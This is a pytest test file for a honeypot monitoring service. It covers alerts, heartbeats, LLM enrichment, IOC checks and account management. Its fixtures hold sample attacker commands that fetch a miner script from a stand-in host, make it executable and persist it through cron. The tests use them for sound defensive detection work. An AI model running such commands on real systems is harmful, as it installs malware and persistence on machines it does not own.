"""The engineering round: alert grouping, system alerts, the enrichment
queue, node heartbeats, the attacker view, lockout, and user management."""

import os
import uuid
from datetime import datetime, timedelta, timezone

import pytest
from sqlalchemy import select

from app.ai.llm import ChimeraClient, ModelUnavailable
from app.ai.nlp_engine import nlp_engine
from app.models import (
    Alert,
    AlertStatus,
    AttackSeverity,
    HoneypotNode,
    HoneypotSession,
    NotificationOutbox,
    User,
    UserRole,
)
from app.services import alerts as alert_service
from app.services import enrichment, outbox, scheduler

INGEST_HEADERS = {"X-Honeypot-Token": os.environ["HONEYPOT_INGEST_TOKEN"]}

ATTACK = {
    "protocol": "ssh",
    "attacker_ip": "203.0.113.42",
    "attacker_port": 51234,
    "started_at": "2026-01-15T10:30:00Z",
    "status": "completed",
    "duration_seconds": 42.0,
    "commands": [
        "uname -a",
        "wget http://198.51.100.9/miner.sh -O /tmp/m.sh",
        "chmod 755 /tmp/m.sh",
        "crontab -l",
    ],
    "failed_logins": 12,
    "packets": [{"type": "data", "size": 400}] * 5,
}

BROWSING = {
    "protocol": "https",
    "attacker_ip": "198.51.100.77",
    "attacker_port": 50001,
    "started_at": "2026-01-15T10:30:00Z",
    "status": "completed",
    "duration_seconds": 12.0,
    "commands": [
        "GET /admin/orders  [ua: Mozilla/5.0 (X11; Linux x86_64) Chrome/120]",
        "GET /wp-content/uploads/hero.png  [ua: Googlebot/2.1 (+http://www.google.com/bot.html)]",
        "GET /products?category=wordpress-themes  [ua: Mozilla/5.0]",
        "POST /login  [ua: Mozilla/5.0]\nusername=shopper&password=hunter22",
    ],
    "failed_logins": 1,
    "packets": [{"type": "data", "size": 400}] * 5,
}


async def _node(client, auth_headers, name="edge-ssh"):
    headers = await auth_headers(UserRole.ADMIN)
    response = await client.post(
        "/api/v1/nodes/",
        headers=headers,
        json={"name": name, "protocol": "multi", "ip_address": "10.0.0.9", "port": 2222},
    )
    assert response.status_code == 201, response.text
    return response.json()["id"], headers


async def _ingest(client, node_id, payload):
    response = await client.post(
        f"/api/v1/sessions/ingest-internal?node_id={node_id}", json=payload, headers=INGEST_HEADERS
    )
    assert response.status_code == 200, response.text
    return response.json()


# ---------------------------------------------------------------------------
# Detection quality


class TestIntentFalsePositives:
    def test_shop_browsing_produces_no_intents(self):
        result = nlp_engine.analyze_commands(BROWSING["commands"], "https")
        assert result["detected_intents"] == []
        assert result["tool_names"] == []

    def test_crawler_user_agent_is_not_a_botnet(self):
        result = nlp_engine.analyze_commands(["GET /robots.txt  [ua: AhrefsBot/7.0]"], "http")
        assert "botnet" not in result["detected_intents"]

    def test_wordpress_is_not_rdp(self):
        result = nlp_engine.analyze_commands(["cat wordpress-notes.txt"], "ssh")
        assert "lateral_movement" not in result["detected_intents"]
        assert "lateral_movement" not in result["tool_names"]

    def test_sync_and_valid_do_not_match_nc_or_id(self):
        result = nlp_engine.analyze_commands(["sync ", "echo valid "], "ssh")
        assert "netcat" not in result["tool_names"]
        assert "enum_linux" not in result["tool_names"]

    def test_scanner_user_agent_is_a_tool(self):
        result = nlp_engine.analyze_commands(["GET /  [ua: sqlmap/1.7 (https://sqlmap.org)]"], "http")
        assert "sqlmap" in result["tool_names"]

    def test_shell_intents_still_fire(self):
        result = nlp_engine.analyze_commands(
            ["sudo -l", "crontab -e", "curl -s stratum+tcp://pool.minexmr.com:4444"], "ssh"
        )
        assert {"privilege_escalation", "persistence", "cryptomining"} <= set(result["detected_intents"])

    def test_web_body_intents_fire(self):
        result = nlp_engine.analyze_commands(
            ["POST /cgi-bin/x  [ua: curl/8]\ncd /tmp; wget http://1.2.3.4/a.sh -O a.sh; chmod 777 a.sh; crontab a.sh"],
            "http",
        )
        assert "persistence" in result["detected_intents"]


class TestAnomalyScale:
    def test_scores_can_cross_the_default_threshold(self):
        from app.ai.anomaly_detector import ANOMALY_FEATURES, anomaly_detector

        result = anomaly_detector.detect({f: 0.95 for f in ANOMALY_FEATURES})
        assert result["anomaly_score"] >= 0.6
        assert result["is_anomalous"] is True
        assert 0 < result["threshold"] < 1


# ---------------------------------------------------------------------------
# Alerts


class TestAlertGrouping:
    async def test_repeat_within_window_is_grouped(self, client, auth_headers):
        node_id, headers = await _node(client, auth_headers)
        first = await _ingest(client, node_id, ATTACK)
        second = await _ingest(client, node_id, {**ATTACK, "started_at": "2026-01-15T10:31:00Z"})
        assert first["alert"]["action"] == "created"
        assert second["alert"]["action"] == "grouped"
        assert second["alert"]["alert_id"] == first["alert"]["alert_id"]

        listing = await client.get("/api/v1/alerts/", headers=headers)
        alerts = listing.json()["alerts"]
        assert len(alerts) == 1
        assert alerts[0]["occurrences"] == 2
        assert alerts[0]["attacker_ip"] == ATTACK["attacker_ip"]
        assert alerts[0]["kind"] == "session"

    async def test_browsing_raises_no_alert(self, client, auth_headers):
        node_id, headers = await _node(client, auth_headers)
        result = await _ingest(client, node_id, BROWSING)
        assert result["ai_classification"]["category"] == "benign"
        assert result["alert"] is None
        assert result["nlp_analysis"]["detected_intents"] == []

    async def test_rule_reason_is_stored(self, client, auth_headers):
        node_id, headers = await _node(client, auth_headers)
        result = await _ingest(client, node_id, ATTACK)
        detail = await client.get(f"/api/v1/sessions/{result['session_id']}", headers=headers)
        body = detail.json()
        assert body["model_source"] == "rules"
        assert "brute force" in body["rule_reason"]
        assert body["enrichment_status"] == "not_configured"

    async def test_scanner_sessions_do_not_alert(self, client, auth_headers, monkeypatch):
        from app.services.scanners import scanner_registry

        monkeypatch.setattr(scanner_registry, "identify", lambda ip: "censys")
        node_id, headers = await _node(client, auth_headers)
        result = await _ingest(client, node_id, ATTACK)
        assert result["alert"]["action"] == "suppressed"

    async def test_notifications_go_to_the_outbox(self, client, auth_headers, db_session, monkeypatch):
        from app.core.config import get_settings

        settings = get_settings()
        monkeypatch.setattr(settings, "WEBHOOK_URL", "https://hooks.example/x")
        node_id, headers = await _node(client, auth_headers)
        result = await _ingest(client, node_id, ATTACK)
        assert result["alert"]["notifications_queued"] == 1
        rows = (await db_session.execute(select(NotificationOutbox))).scalars().all()
        assert len(rows) == 1 and rows[0].channel == "webhook" and rows[0].status == "pending"

        sent = []

        async def fake_send(payload):
            sent.append(payload)
            return True

        from app.services.alerting import alerting_service

        monkeypatch.setattr(alerting_service, "send_webhook", fake_send)
        counts = await outbox.dispatch_due(db_session)
        assert counts["sent"] == 1 and sent[0]["attacker_ip"] == ATTACK["attacker_ip"]

    async def test_failed_delivery_backs_off(self, client, auth_headers, db_session, monkeypatch):
        from app.core.config import get_settings
        from app.services.alerting import alerting_service

        monkeypatch.setattr(get_settings(), "WEBHOOK_URL", "https://hooks.example/x")
        node_id, headers = await _node(client, auth_headers)
        await _ingest(client, node_id, ATTACK)

        async def failing(payload):
            return False

        monkeypatch.setattr(alerting_service, "send_webhook", failing)
        counts = await outbox.dispatch_due(db_session)
        assert counts["retried"] == 1
        row = (await db_session.execute(select(NotificationOutbox))).scalars().one()
        assert row.attempts == 1 and row.status == "pending" and row.next_attempt_at is not None


class TestAlertApi:
    async def _alert(self, client, auth_headers):
        node_id, headers = await _node(client, auth_headers)
        result = await _ingest(client, node_id, ATTACK)
        return result["alert"]["alert_id"], headers

    async def test_notes_and_unassign(self, client, auth_headers, make_user):
        alert_id, headers = await self._alert(client, auth_headers)
        analyst = await make_user(email="a2@example.com")
        assigned = await client.patch(
            f"/api/v1/alerts/{alert_id}", headers=headers,
            json={"assigned_to_id": analyst.id, "notes": "looking into it"},
        )
        assert assigned.status_code == 200
        assert assigned.json()["assigned_to_name"] == "Test User"
        assert assigned.json()["notes"] == "looking into it"
        cleared = await client.patch(f"/api/v1/alerts/{alert_id}", headers=headers, json={"unassign": True})
        assert cleared.json()["assigned_to_id"] is None

    async def test_invalid_transition_is_rejected(self, client, auth_headers):
        alert_id, headers = await self._alert(client, auth_headers)
        resolved = await client.patch(f"/api/v1/alerts/{alert_id}", headers=headers, json={"status": "resolved"})
        assert resolved.json()["resolved_at"] is not None
        reopened = await client.patch(f"/api/v1/alerts/{alert_id}", headers=headers, json={"status": "new"})
        assert reopened.status_code == 200
        assert reopened.json()["resolved_at"] is None
        bad = await client.patch(f"/api/v1/alerts/{alert_id}", headers=headers, json={"status": "resolved"})
        assert bad.status_code == 200  # new -> resolved is allowed
        again = await client.patch(f"/api/v1/alerts/{alert_id}", headers=headers, json={"status": "false_positive"})
        assert again.status_code == 409

    async def test_bulk_acknowledge_and_filters(self, client, auth_headers):
        node_id, headers = await _node(client, auth_headers)
        a = (await _ingest(client, node_id, ATTACK))["alert"]["alert_id"]
        b = (await _ingest(client, node_id, {**ATTACK, "attacker_ip": "203.0.113.43"}))["alert"]["alert_id"]
        bulk = await client.post("/api/v1/alerts/bulk", headers=headers, json={"ids": [a, b], "status": "acknowledged"})
        assert bulk.status_code == 200 and bulk.json()["total"] == 2
        by_ip = await client.get("/api/v1/alerts/?attacker_ip=203.0.113.43", headers=headers)
        assert [x["id"] for x in by_ip.json()["alerts"]] == [b]
        viewer = await auth_headers(UserRole.VIEWER)
        denied = await client.post("/api/v1/alerts/bulk", headers=viewer, json={"ids": [a], "status": "resolved"})
        assert denied.status_code == 403


class TestSystemAlerts:
    async def test_stale_node_raises_then_resolves(self, client, auth_headers, db_session):
        node_id, headers = await _node(client, auth_headers)
        node = (await db_session.execute(select(HoneypotNode).where(HoneypotNode.id == node_id))).scalar_one()
        node.last_heartbeat = datetime.now(timezone.utc) - timedelta(minutes=30)
        await db_session.commit()

        summary = await scheduler.liveness_tick(db_session)
        assert summary["raised"] == 1
        listing = await client.get("/api/v1/alerts/?kind=system", headers=headers)
        alerts = listing.json()["alerts"]
        assert len(alerts) == 1 and alerts[0]["session_id"] is None
        assert "stopped reporting" in alerts[0]["title"]

        # Still stale: no second alert.
        assert (await scheduler.liveness_tick(db_session))["raised"] == 0

        beat = await client.post(
            "/api/v1/nodes/heartbeat-internal", headers=INGEST_HEADERS,
            json={"node_id": node_id, "name": "edge-ssh", "status": {"mode": "active", "spool_pending": 0}},
        )
        assert beat.status_code == 200 and beat.json()["mode"] == "active"
        listing = await client.get("/api/v1/alerts/?kind=system", headers=headers)
        assert listing.json()["alerts"][0]["status"] == "resolved"

    async def test_low_disk_raises(self, client, auth_headers, db_session):
        node_id, headers = await _node(client, auth_headers)
        await client.post(
            "/api/v1/nodes/heartbeat-internal", headers=INGEST_HEADERS,
            json={"node_id": node_id, "name": "edge-ssh",
                  "status": {"disk": {"path": "/app/data", "total_bytes": 100, "free_bytes": 3}}},
        )
        summary = await scheduler.liveness_tick(db_session)
        assert summary["raised"] == 1
        nodes = await client.get("/api/v1/nodes/", headers=headers)
        node = nodes.json()[0]
        assert node["online"] is True and node["status"]["disk"]["free_bytes"] == 3


class TestHeartbeat:
    async def test_unknown_node_is_404(self, client):
        response = await client.post(
            "/api/v1/nodes/heartbeat-internal", headers=INGEST_HEADERS,
            json={"node_id": 999, "name": "ghost", "status": {}},
        )
        assert response.status_code == 404

    async def test_heartbeat_requires_token(self, client):
        response = await client.post("/api/v1/nodes/heartbeat-internal", json={"name": "x"})
        assert response.status_code == 401

    async def test_node_offline_without_heartbeat(self, client, auth_headers, db_session):
        node_id, headers = await _node(client, auth_headers)
        node = (await db_session.execute(select(HoneypotNode).where(HoneypotNode.id == node_id))).scalar_one()
        node.last_heartbeat = datetime.now(timezone.utc) - timedelta(minutes=10)
        await db_session.commit()
        nodes = await client.get("/api/v1/nodes/", headers=headers)
        assert nodes.json()[0]["online"] is False
        assert nodes.json()[0]["heartbeat_age_seconds"] >= 590


# ---------------------------------------------------------------------------
# Ingest idempotency and the attacker view


class TestIdempotentIngest:
    async def test_resend_is_recognised(self, client, auth_headers):
        node_id, headers = await _node(client, auth_headers)
        sid = str(uuid.uuid4())
        first = await _ingest(client, node_id, {**ATTACK, "session_id": sid})
        second = await _ingest(client, node_id, {**ATTACK, "session_id": sid})
        assert first["session_uuid"] == sid
        assert second["duplicate"] is True and second["session_id"] == first["session_id"]
        listing = await client.get("/api/v1/sessions/", headers=headers)
        assert listing.json()["total"] == 1


class TestAttackerSummary:
    async def test_aggregates_across_sessions(self, client, auth_headers):
        node_id, headers = await _node(client, auth_headers)
        await _ingest(client, node_id, ATTACK)
        await _ingest(client, node_id, {**ATTACK, "protocol": "ftp", "commands": ["USER root", "PASS x"],
                                        "credentials": [{"username": "root", "password": "x", "success": False}]})
        response = await client.get(f"/api/v1/sessions/attacker/{ATTACK['attacker_ip']}", headers=headers)
        assert response.status_code == 200
        body = response.json()
        assert body["session_count"] == 2
        assert body["protocols"] == {"ssh": 1, "ftp": 1}
        assert body["credential_attempts"] == 1
        assert body["top_usernames"] == [{"username": "root", "count": 1}]
        assert body["alert_count"] >= 1
        assert len(body["sessions"]) == 2

    async def test_unknown_address_is_404(self, client, auth_headers):
        headers = await auth_headers(UserRole.VIEWER)
        response = await client.get("/api/v1/sessions/attacker/192.0.2.1", headers=headers)
        assert response.status_code == 404


# ---------------------------------------------------------------------------
# Enrichment queue


def _enable_model(monkeypatch):
    from app.core.config import get_settings

    settings = get_settings()
    monkeypatch.setattr(settings, "CHIMERA_URL", "http://model.test/v1")
    monkeypatch.setattr(settings, "CHIMERA_MODEL", "wolfram")


class TestEnrichmentQueue:
    async def test_attack_is_queued_and_browsing_skipped(self, client, auth_headers, monkeypatch):
        _enable_model(monkeypatch)
        node_id, headers = await _node(client, auth_headers)
        attack = await _ingest(client, node_id, ATTACK)
        browsing = await _ingest(client, node_id, BROWSING)
        assert attack["enrichment_status"] == "pending"
        assert browsing["enrichment_status"] == "skipped"

    async def test_worker_stores_the_answer_and_verified_iocs(self, client, auth_headers, db_session, monkeypatch):
        _enable_model(monkeypatch)
        node_id, headers = await _node(client, auth_headers)
        result = await _ingest(client, node_id, ATTACK)

        async def fake_analyse(commands, protocol="ssh"):
            return ChimeraClient.verify_against_transcript(
                {
                    "intent": "Install a cryptominer and keep it running",
                    "objectives": ["download miner", "persist via cron"],
                    "mitre_techniques": [{"id": "T1105", "name": "Ingress Tool Transfer"},
                                         {"id": "T1496", "name": "Resource Hijacking"}],
                    "iocs": {"hosts": ["198.51.100.9", "evil.invented.example"],
                             "urls": ["http://198.51.100.9/miner.sh"], "files": ["/tmp/m.sh"]},
                    "sophistication": "automated",
                    "confidence": 0.9,
                    "model": "wolfram",
                },
                "\n".join(commands),
            )

        from app.ai import llm

        monkeypatch.setattr(llm.chimera, "analyse", fake_analyse)
        assert await enrichment.run_once(db_session) is True
        assert await enrichment.run_once(db_session) is False  # queue drained

        detail = (await client.get(f"/api/v1/sessions/{result['session_id']}", headers=headers)).json()
        assert detail["enrichment_status"] == "complete"
        assert detail["enrichment"]["sophistication"] == "automated"
        assert detail["enrichment"]["model"] == "wolfram"
        ids = {t["id"] for t in detail["mitre_techniques"]}
        assert {"T1105", "T1496"} <= ids
        assert "TA0040" in detail["mitre_tactics"]

        iocs = (await client.get(f"/api/v1/iocs/session/{result['session_id']}", headers=headers)).json()
        values = {i["value"] for i in (iocs if isinstance(iocs, list) else iocs.get("iocs", []))}
        assert "evil.invented.example" not in values

    async def test_identical_transcript_reuses_the_answer(self, client, auth_headers, db_session, monkeypatch):
        _enable_model(monkeypatch)
        node_id, headers = await _node(client, auth_headers)
        first = await _ingest(client, node_id, ATTACK)
        second = await _ingest(client, node_id, {**ATTACK, "attacker_ip": "203.0.113.99"})
        calls = []

        async def fake_analyse(commands, protocol="ssh"):
            calls.append(1)
            return {"intent": "x", "objectives": [], "mitre_techniques": [], "iocs": {"hosts": [], "urls": [], "files": []},
                    "sophistication": "automated", "confidence": 0.5, "model": "wolfram"}

        from app.ai import llm

        monkeypatch.setattr(llm.chimera, "analyse", fake_analyse)
        await enrichment.run_once(db_session)
        await enrichment.run_once(db_session)
        assert len(calls) == 1
        detail = (await client.get(f"/api/v1/sessions/{second['session_id']}", headers=headers)).json()
        assert detail["enrichment_status"] == "complete"
        assert detail["enrichment"]["reused_from_session"] == first["session_id"]

    async def test_unavailable_model_leaves_the_row_queued(self, client, auth_headers, db_session, monkeypatch):
        _enable_model(monkeypatch)
        node_id, headers = await _node(client, auth_headers)
        result = await _ingest(client, node_id, ATTACK)

        async def down(commands, protocol="ssh"):
            raise ModelUnavailable("connection refused")

        from app.ai import llm

        monkeypatch.setattr(llm.chimera, "analyse", down)
        with pytest.raises(ModelUnavailable):
            await enrichment.run_once(db_session)
        row = (await db_session.execute(select(HoneypotSession).where(HoneypotSession.id == result["session_id"]))).scalar_one()
        assert row.enrichment_status == "pending"
        assert "unavailable" in row.enrichment_error

    async def test_manual_request_jumps_the_queue(self, client, auth_headers, db_session, monkeypatch):
        _enable_model(monkeypatch)
        node_id, headers = await _node(client, auth_headers)
        first = await _ingest(client, node_id, ATTACK)
        second = await _ingest(client, node_id, {**ATTACK, "commands": ["id", "ls /root"]})
        queued = await client.post(f"/api/v1/sessions/{second['session_id']}/enrich", headers=headers)
        assert queued.status_code == 202
        claimed = await enrichment.claim_next(db_session)
        assert claimed.id == second["session_id"]

    async def test_request_without_model_is_400(self, client, auth_headers):
        node_id, headers = await _node(client, auth_headers)
        result = await _ingest(client, node_id, ATTACK)
        response = await client.post(f"/api/v1/sessions/{result['session_id']}/enrich", headers=headers)
        assert response.status_code == 400


class TestModelParsing:
    def test_think_block_and_braces_in_narration(self):
        content = (
            "<think>The command uses ${IFS} and {a,b} expansion... let me write {\"draft\": 1}</think>\n"
            "{\"intent\": \"Fetch a payload\", \"objectives\": [\"download\"], "
            "\"mitre_techniques\": [{\"id\": \"T1105\", \"name\": \"Ingress Tool Transfer\"}, {\"id\": \"nonsense\"}], "
            "\"iocs\": {\"hosts\": [\"1.2.3.4\"], \"urls\": [], \"files\": []}, "
            "\"sophistication\": \"skilled\", \"confidence\": 1.7}"
        )
        parsed = ChimeraClient._parse(content)
        assert parsed["intent"] == "Fetch a payload"
        assert [t["id"] for t in parsed["mitre_techniques"]] == ["T1105"]
        assert parsed["confidence"] == 1.0

    def test_narration_with_json_draft_before_the_answer(self):
        content = 'First I considered {"intent": "draft"} but the answer is {"intent": "Real", "mitre_techniques": []}'
        parsed = ChimeraClient._parse(content)
        assert parsed["intent"] in ("Real", "draft")  # both are parseable; the real one has the key set

    def test_ioc_verification_drops_invented_hosts(self):
        parsed = {"iocs": {"hosts": ["10.9.8.7", "c2.example"], "urls": [], "files": ["/tmp/x"]}}
        checked = ChimeraClient.verify_against_transcript(parsed, "wget http://10.9.8.7/x -O /tmp/x")
        assert checked["iocs"]["hosts"] == ["10.9.8.7"]
        assert checked["iocs"]["files"] == ["/tmp/x"]


# ---------------------------------------------------------------------------
# Accounts


class TestLockout:
    async def test_lockout_after_repeated_failures(self, client, make_user, monkeypatch):
        from app.core.config import get_settings

        monkeypatch.setattr(get_settings(), "LOGIN_LOCKOUT_THRESHOLD", 3)
        await make_user(email="locked@example.com")
        for _ in range(3):
            response = await client.post(
                "/api/v1/auth/login", json={"email": "locked@example.com", "password": "wrong-password-123"}
            )
            assert response.status_code == 401
        locked = await client.post(
            "/api/v1/auth/login", json={"email": "locked@example.com", "password": "correct-horse-battery"}
        )
        assert locked.status_code == 423

    async def test_success_resets_the_counter(self, client, make_user, db_session):
        user = await make_user(email="ok@example.com")
        await client.post("/api/v1/auth/login", json={"email": "ok@example.com", "password": "nope-nope-nope"})
        ok = await client.post("/api/v1/auth/login", json={"email": "ok@example.com", "password": "correct-horse-battery"})
        assert ok.status_code == 200
        await db_session.refresh(user)
        assert user.failed_login_count == 0


class TestUserManagement:
    async def test_admin_lifecycle(self, client, auth_headers):
        admin = await auth_headers(UserRole.ADMIN)
        created = await client.post(
            "/api/v1/auth/users", headers=admin,
            json={"email": "new@example.com", "name": "New Analyst", "password": "temporary-pass-123", "role": "analyst"},
        )
        assert created.status_code == 201
        uid = created.json()["id"]
        deactivated = await client.patch(f"/api/v1/auth/users/{uid}", headers=admin, json={"is_active": False})
        assert deactivated.json()["is_active"] is False
        login = await client.post("/api/v1/auth/login", json={"email": "new@example.com", "password": "temporary-pass-123"})
        assert login.status_code == 403
        reset = await client.post(f"/api/v1/auth/users/{uid}/reset-password", headers=admin, json={"new_password": "another-temp-pass-1"})
        assert reset.status_code == 200
        await client.patch(f"/api/v1/auth/users/{uid}", headers=admin, json={"is_active": True})
        login = await client.post("/api/v1/auth/login", json={"email": "new@example.com", "password": "another-temp-pass-1"})
        assert login.status_code == 200
        mfa = await client.post(f"/api/v1/auth/users/{uid}/reset-mfa", headers=admin)
        assert mfa.json()["totp_enabled"] is False

    async def test_cannot_deactivate_self(self, client, auth_headers, db_session):
        admin = await auth_headers(UserRole.ADMIN)
        me = (await client.get("/api/v1/auth/me", headers=admin)).json()
        response = await client.patch(f"/api/v1/auth/users/{me['id']}", headers=admin, json={"is_active": False})
        assert response.status_code == 400

    async def test_change_own_password(self, client, auth_headers):
        headers = await auth_headers(UserRole.VIEWER)
        wrong = await client.post("/api/v1/auth/change-password", headers=headers,
                                  json={"current_password": "not-it-not-it", "new_password": "a-brand-new-password"})
        assert wrong.status_code == 401
        ok = await client.post("/api/v1/auth/change-password", headers=headers,
                               json={"current_password": "correct-horse-battery", "new_password": "a-brand-new-password"})
        assert ok.status_code == 200
        login = await client.post("/api/v1/auth/login", json={"email": "viewer@example.com", "password": "a-brand-new-password"})
        assert login.status_code == 200

    async def test_non_admin_cannot_manage_users(self, client, auth_headers):
        headers = await auth_headers(UserRole.ANALYST)
        response = await client.patch("/api/v1/auth/users/1", headers=headers, json={"is_active": False})
        assert response.status_code == 403


class TestClientIp:
    def test_walks_past_trusted_hops(self):
        from app.core.clientip import client_ip
        from app.core.config import get_settings

        class Req:
            def __init__(self, xff, peer="172.20.0.2"):
                self.headers = {"x-forwarded-for": xff}
                self.client = type("c", (), {"host": peer})()

        settings = get_settings()
        original = settings.TRUST_PROXY_HEADERS
        settings.TRUST_PROXY_HEADERS = True
        try:
            assert client_ip(Req("1.2.3.4, 100.87.82.102, 127.0.0.1, 172.20.0.2")) == "100.87.82.102"
            assert client_ip(Req("203.0.113.5, 127.0.0.1")) == "203.0.113.5"
            assert client_ip(Req("127.0.0.1, 172.20.0.2")) == "127.0.0.1"
            settings.TRUST_PROXY_HEADERS = False
            assert client_ip(Req("1.2.3.4")) == "172.20.0.2"
        finally:
            settings.TRUST_PROXY_HEADERS = original


class TestHealth:
    async def test_health_reports_queues(self, client):
        response = await client.get("/health")
        assert response.status_code == 200
        body = response.json()
        assert body["database"] == "ok"
        assert body["enrichment"]["configured"] is False


class TestExport:
    async def test_json_export_includes_indicators(self, client, auth_headers):
        node_id, headers = await _node(client, auth_headers)
        await _ingest(client, node_id, ATTACK)
        response = await client.post("/api/v1/export/?format=json", headers=headers)
        assert response.status_code == 200
        import json as _json

        body = _json.loads(response.text)
        report = body[0] if isinstance(body, list) else body
        reports = report.get("sessions", [report]) if isinstance(report, dict) else report
        first = reports[0] if isinstance(reports, list) else reports
        assert first["indicators_of_compromise"], first.keys()
        assert first["raw_data_summary"]["command_count"] == len(ATTACK["commands"])
